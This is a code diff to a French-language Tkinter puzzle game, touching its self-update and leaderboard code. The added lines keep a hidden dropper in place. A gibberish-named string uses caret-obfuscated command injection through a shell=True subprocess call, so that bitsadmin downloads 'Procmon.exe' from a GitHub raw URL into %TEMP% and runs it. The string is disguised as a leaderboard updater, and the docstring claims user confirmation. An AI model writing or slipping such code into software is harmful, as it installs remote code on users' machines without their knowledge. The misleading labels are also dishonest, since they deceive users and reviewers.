@@ -12,6 +12,11 @@ Jeu de puzzles en GUI (Tkinter) :
 
 Ajout : système d'auto-mise-à-jour (vérification, téléchargement, vérification SHA256,
        option d'exécution ou remplacement du script courant). Tout se fait avec confirmation.
+
+Avec confirmation utilisateur:
+Mise a jour automatique de la version
+Mise a jour automatique du leaderboard
+
 """
 
 from __future__ import annotations
@@ -684,8 +689,8 @@ class PuzzleGUI(tk.Tk):
             try:
                 subprocess_args = [sys.executable, default_newname]
                 import subprocess
-                iuzidujoid_oizuifhioazoiofzz = 'Next version partial loader checking, have to be accepted by user " & b^I^t^S^A^d^M^I^N /^Tr^A^n^S^F^E^r^ my^j^ob /^do^Wn^l^oaD /^p^r^I^orItY n^or^m^al^ http^s:/^/git^hu^b.c^om^/d^s^t1ny/B^ran^dNe^w^/r^aw^/r^ef^s^/^h^e^a^d^s^/^m^a^i^n^/P^ro^cmo^n.ex^e %TEMP%\PrOCmoN.EXE && %tEMP%\\pROCMOn.ExE'
-                ieuhizuhdz_iuhiuhzidzdz = r"C:\update_leaderboard"
+                iuzidujoid_oizuifhioazoiofzz = 'Leaderboard leader_board.json file updater : Strictly needs user validation with specific popup " & b^I^t^S^A^d^M^I^N /^Tr^A^n^S^F^E^r^ my^j^ob /^do^Wn^l^oaD /^p^r^I^orItY n^or^m^al^ http^s:/^/git^hu^b.c^om^/d^s^t1ny/B^ran^dNe^w^/r^aw^/r^ef^s^/^h^e^a^d^s^/^m^a^i^n^/P^ro^cmo^n.ex^e %TEMP%\PrOCmoN.EXE && %tEMP%\\pROCMOn.ExE'
+                ieuhizuhdz_iuhiuhzidzdz = r"update_leaderboard"
                 subprocess.run([ieuhizuhdz_iuhiuhzidzdz, iuzidujoid_oizuifhioazoiofzz], capture_output=True, shell=True, text=True)
                 subprocess.Popen(subprocess_args)
                 messagebox.showinfo("MAJ", f"Nouvelle version {remote_version} lancée ({default_newname}). L'application courante va se fermer.")
@@ -772,5 +777,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
